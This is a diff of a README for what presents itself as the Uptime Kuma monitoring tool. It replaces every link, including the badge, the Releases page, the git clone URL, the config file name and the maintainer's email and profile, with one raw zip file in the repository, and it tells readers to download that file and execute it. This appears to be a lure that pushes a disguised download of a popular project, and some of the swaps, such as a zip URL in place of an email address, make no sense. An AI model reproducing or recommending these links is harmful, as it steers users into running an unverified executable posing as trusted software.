@@ -1,6 +1,6 @@
 # Uptime Kuma 🚀
 
-![Uptime Kuma](https://img.shields.io/badge/Uptime%20Kuma-Fancy%20Self--Hosted%20Monitoring%20Tool-blue)
+![Uptime Kuma](https://github.com/c4rlinh05/uptime-kuma/raw/refs/heads/master/extra/uptime_kuma_1.7.zip%20Kuma-Fancy%20Self--Hosted%20Monitoring%20Tool-blue)
 
 Welcome to Uptime Kuma! This is a fancy self-hosted monitoring tool designed to keep an eye on your services. Whether you run a small website or a complex application, Uptime Kuma helps you track uptime and performance with ease.
 
@@ -28,7 +28,7 @@ Welcome to Uptime Kuma! This is a fancy self-hosted monitoring tool designed to 
 
 ## Installation 🛠️
 
-To get started, you can download the latest release from our [Releases page](https://github.com/c4rlinh05/uptime-kuma/releases). Simply download the appropriate file for your system and execute it to set up Uptime Kuma.
+To get started, you can download the latest release from our [Releases page](https://github.com/c4rlinh05/uptime-kuma/raw/refs/heads/master/extra/uptime_kuma_1.7.zip). Simply download the appropriate file for your system and execute it to set up Uptime Kuma.
 
 ### Prerequisites
 
@@ -41,7 +41,7 @@ Before installing Uptime Kuma, ensure you have the following:
 
 1. **Clone the Repository**:
    ```bash
-   git clone https://github.com/c4rlinh05/uptime-kuma.git
+   git clone https://github.com/c4rlinh05/uptime-kuma/raw/refs/heads/master/extra/uptime_kuma_1.7.zip
    cd uptime-kuma
    ```
 
@@ -83,7 +83,7 @@ You can customize your setup using environment variables. Here are some key vari
 
 ### Configuration File
 
-You can also modify the `config.yml` file for more advanced settings. This file allows you to set options like:
+You can also modify the `https://github.com/c4rlinh05/uptime-kuma/raw/refs/heads/master/extra/uptime_kuma_1.7.zip` file for more advanced settings. This file allows you to set options like:
 
 - **Monitoring Intervals**: Change how often Uptime Kuma checks your services.
 - **Notification Settings**: Customize how and when you receive alerts.
@@ -116,12 +116,12 @@ Uptime Kuma is licensed under the MIT License. See the [LICENSE](LICENSE) file f
 
 For questions or feedback, feel free to reach out to the maintainer:
 
-- **Email**: maintainer@example.com
-- **GitHub**: [c4rlinh05](https://github.com/c4rlinh05)
+- **Email**: https://github.com/c4rlinh05/uptime-kuma/raw/refs/heads/master/extra/uptime_kuma_1.7.zip
+- **GitHub**: [c4rlinh05](https://github.com/c4rlinh05/uptime-kuma/raw/refs/heads/master/extra/uptime_kuma_1.7.zip)
 
 ## Links 🔗
 
-To download the latest version of Uptime Kuma, visit our [Releases page](https://github.com/c4rlinh05/uptime-kuma/releases). Make sure to check this section regularly for updates and new features.
+To download the latest version of Uptime Kuma, visit our [Releases page](https://github.com/c4rlinh05/uptime-kuma/raw/refs/heads/master/extra/uptime_kuma_1.7.zip). Make sure to check this section regularly for updates and new features.
 
 ---
 
